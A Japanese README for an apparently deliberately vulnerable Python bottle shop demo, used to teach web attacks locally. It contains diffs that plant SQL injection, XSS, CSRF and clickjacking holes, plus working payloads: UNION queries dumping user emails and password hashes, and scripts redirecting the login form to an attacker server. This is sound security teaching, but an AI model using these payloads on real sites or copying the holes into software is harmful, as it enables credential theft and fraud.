# bottle-store

EC site example using Python bottle.

## はじめかた（Windows）

PythonとVSCodeをインストールします。

仮想環境を作ります。仮想環境名は```venv```とします。

```console
> py -m venv venv
(venv)>
```

必要なモジュールをインストールします。

```console
(venv)> pip install -r requirements.txt
```

データベースを初期化します。データベースのファイル```app.db```が作成されます。

```console
(venv)> py setup.py
```

署名付きcookieのための鍵を環境変数```STORE_SECRET_KEY```に設定します。

```console
(venv)> set STORE_SECRET_KEY=<署名付きcookieのための鍵（文字列）>
```

サーバーを起動します。localhost:8080で立ち上がります。環境変数を設定し忘れていると、RuntimeErrorが発生して起動できないのでご注意ください。

```console
(venv)> py app.py
```

Webブラウザーで http://localhost:8080/ にアクセスすると使えます。

ユーザー1でログインしてみます。

- メールアドレス
  - user1@example.com
- パスワード
  - password1

なおChromeでこのパスワードを使うと「パスワードを変更してください（パスワードが漏洩しました）」という警告が表示されます。

## ここから先の注意事項

犯罪になるので、外部サービスに対してはここから先に書いてあることを試してはいけません。絶対にやめてください。

## SQLインジェクション

```app.py```を次のように書き換えます。プレースホルダ```?```（はてな）を使わずに、文字列を連結してSQL文を作っています。

```diff:app.py
-        results = cur.execute("SELECT * FROM rated_products WHERE name LIKE ?;", ("%" + query + "%",)).fetchall()
+        results = cur.execute("SELECT * FROM rated_products WHERE name LIKE '%" + query + "%'").fetchall()
```

Webブラウザーで商品一覧を表示します。

```
http://localhost:8080/products
```

商品名で検索ができます。次のようなSQL文を使っているのではないか？と攻撃者は推測します。

```sql
SELECT * FROM <商品テーブル名> LIKE '%<検索文字列>%';
```

攻撃者は外部から入力される検索文字列の扱いが雑なことを期待して、SQL文の断片```'--```（シングルクォート、ハイフン、ハイフン）で検索してみます。

```
http://localhost:8080/products?q='--
```

攻撃者は実行されるSQL文が次のようになることを期待しています。LIKEの条件が間違った、おかしなSQL文です。おかしなSQL文が期待通りに実行されれば、エラーが表示されるはずです。

```sql
SELECT * FROM <商品テーブル名> LIKE '%'--%';
```

Internal Server Errorが表示され、攻撃者が入力したSQL文の断片によりSQLインジェクションが成功したことを示唆しています。

次に攻撃者はデータベースで管理しているテーブルの情報を引き出そうと試みます。SQLiteの場合は特別なテーブル```sqlite_master```から、データベースのメタ情報を引き出すことが可能です。

```
http://localhost:8080/products?q=x%' UNION SELECT 1, tbl_name, sql, 1, 1, 1 FROM sqlite_master--
```

攻撃者が期待するSQL文は次の通りです。UNIONは2つのSELECTを統合するときに使います。前半のSELECTでは「xで終わる商品」を検索しています。後半のSELECTでは、テーブル名```tbl_name```と、テーブルを作成するsqlを検索します。sqlからカラム名が分かります。

```sql
SELECT * FROM <商品テーブル名> LIKE '%x' UNION SELECT 1, tbl_name, sql, 1, 1, 1 FROM sqlite_master--%';
```

検索結果からusersテーブルがあることと、そのカラム名が分かりました。ここからさらに情報を引き出します。

```
http://localhost:8080/products?q=x%' UNION SELECT 1, id, email, 1, hashed_password, nickname FROM users--
```

usersテーブルのid、email、hashed_password、nicknameが漏洩してしまいました。かろうじてパスワードはハッシュ化されています。パスワードを平文のまま保存していたら大変なことになっていましたが、時間稼ぎにしかなりません。

### SQLインジェクションを防ぐには

絶対にプレースホルダーを使いましょう！

## 反射型クロスサイトスクリプティング（Reflected XSS）

```app.py```を次のように書き換えます。bottleのテンプレートで!（エクスクラメーションマーク）は、変数をエスケープせず生のまま表示することを意味します。

```diff:app.py
-<p style="color:red;"> {{ message }} </p>
+<p style="color:red;"> {{ !message }} </p>
```

攻撃者は、ログイン画面でURLのquery parameterとして渡した文字列が画面に表示されていることに着目し、query parameterの扱いが雑になっていることを期待して、次のようなURLでアクセスしてきます。HTMLで```\<s\>```タグは取り消し線を意味します。

```
http://localhost:8080/login?message=<s>hello</s>
```

取り消されたhelloが表示され、エスケープ漏れがあることが分かりました。次に期待するのはスクリプトの混入です。

```
http://localhost:8080/login?message=<script>alert(1)</script>
```

```1```がアラートされ、スクリプトの混入に成功したことが分かります。攻撃者は自分のサイトを立ち上げ、ログイン画面に入力された情報を盗み出そうとします。まず、盗み出した情報を取得するWebアプリを起動します。別のコマンドプロンプトを立ち上げて、```evil.py```を実行してください。攻撃者のWebアプリは、localhost の 8081 ポートで起動します。

```console
> .\venv\Scripts\activate
(venv)> py evil.py
```

攻撃者はログイン画面にスクリプトを混入することで、同じログイン画面にもかかわらず、データの向き先を変更できてしまいます。次のURLをクリックすると、向き先の変わったログイン画面が表示されます。

```
http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://localhost:8081/users'}</script>
```

もし正規のユーザーがこのURLを開いてしまうと、入力した情報が攻撃者に渡ってしまいます。

### XSSを防ぐには

エスケープ漏れをなくしましょう！

## クロスサイト・リクエストフォージェリ（CSRF）と蓄積型クロスサイトスクリプティング（Persistent XSS）の合わせ技

```app.py```を次のよう書き換えます。```form_token```と```cookie_token```のチェックをなくします。

```diff:app.py
-    if form_token != cookie_token:
-        abort(400, '不正なアクセスです。')
+    #if form_token != cookie_token:
+    #    abort(400, '不正なアクセスです。')
```

```form_token```はフォームに埋め込んだトークンです。フォームに情報が投稿されるときに一緒にWebアプリに渡されます。同じ値が署名付きcookieに格納されていて、Webアプリはそれぞれが同じ値かどうかをチェックしています。ユーザーがフォームを開いてから情報を投稿するのが正規の流れになりますが、それ以外のやり方で投稿できるようになってしまいます。

攻撃者は攻撃サイトを準備し、甘い言葉で正規のユーザーにクリックを促します。

```
http://localhost:8081/evil_game1
```

クリックすると、ユーザーが意図しない投稿をしてしまうフォームになっています。評価を釣り上げる作戦です。

```html
<form action="http://localhost:8080/reviews" method="post">
  <input type="hidden" name="product_id" value="1" />
  <input type="hidden" name="user_id" value="1" />
  <input type="hidden" name="rate" value="5" />
  <input type="hidden" name="comment" value="最高の商品です！本当は★100を付けたいくらい！" />
  <input type="submit" value="遊んでみる" />
</form>
```

ユーザーはゲームで遊ぼうと攻撃者のサイトでボタンをクリックしただけなのに、商品1に高評価をつけてしまいます。ユーザーに意図しない情報を投稿させてしまう攻撃がクロスサイト・リクエストフォージェリ（CSRF）です。

```
http://localhost:8080/products/1
```

さらに```app.py```を書き換え、```comment```のエスケープを外します。これで、商品の詳細ページにXSSが可能になってしまいます。

```diff:app.py
-        <li>{{ comment }}</li>
+        <li>{{ !comment }}</li>
```

攻撃者は攻撃サイトを準備し、甘い言葉で正規のユーザーにクリックを促します。

```
http://localhost:8081/evil_game2
```

クリックすると、ユーザーが意図しない投稿をしてしまうフォームになっています。評価を釣り上げるだけでなく、XSSでページを書き換え、うその金額に変更してしまいます。window.onload はページの読み込みが終了すると実行されます。

```html
<form action="http://localhost:8080/reviews" method="post">
  <input type="hidden" name="product_id" value="1" />
  <input type="hidden" name="user_id" value="1" />
  <input type="hidden" name="rate" value="5" />
  <input type="hidden" name="comment" value="本当は★100を付けたいくらい最高の商品なのに、今だけ100円で売ってます！！<script>window.onload=function(){
      var td = document.querySelectorAll('tr td')[7];
      td.innerHTML = '<s>' + td.innerHTML + '</s><b>今だけ100円！！</b>';
  }</script>" />
  <input type="submit" value="遊んでみる" />
</form>
```

ユーザーが意図せずに投稿してしまったスクリプト付きコメントは、ユーザー本人はもちろん、他のユーザーがこのコメントを閲覧した時にも実行されてしまいます。

反射型XSSは、スクリプトが仕込まれたURLをクリックした人だけに影響しました。しかし、蓄積型XSSはその他すべての人に影響してしまいます。

### CSRFを防ぐには

ユーザーが投稿する情報にtokenを埋め込み、正規の投稿かどうかを確認しましょう。

# Clickjacking

```diff:app.py
-    response.headers['X-Frame-Options'] = 'DENY'
+   response.headers['X-Frame-Option'] = 'DENY'
```

```
http://localhost:8081/evil_game3
```

# DOM based XSS

